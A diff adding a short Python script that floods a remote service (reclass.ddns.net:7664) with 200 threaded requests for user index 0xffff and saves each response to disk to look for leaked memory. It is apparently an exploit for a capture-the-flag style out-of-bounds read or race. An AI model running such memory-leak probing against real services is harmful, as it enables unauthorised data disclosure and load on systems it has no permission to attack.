@@ -1,0 +1,28 @@
+#!/usr/bin/env python3
+import threading
+from test_client import TestClient
+
+ADDR = "reclass.ddns.net"
+PORT = 7664
+
+def worker(i):
+    try:
+        t = TestClient(ADDR, PORT)
+        t.set_user("bob")
+        data = t.get_user(0xffff)
+        with open(f"dump_{i}.bin", "wb") as f:
+            f.write(data)
+    except:
+        pass
+
+threads = []
+
+for i in range(200):
+    th = threading.Thread(target=worker, args=(i,))
+    threads.append(th)
+    th.start()
+
+for t in threads:
+    t.join()
+
+print("Done! Now inspect dumps with: strings dump_*.bin")
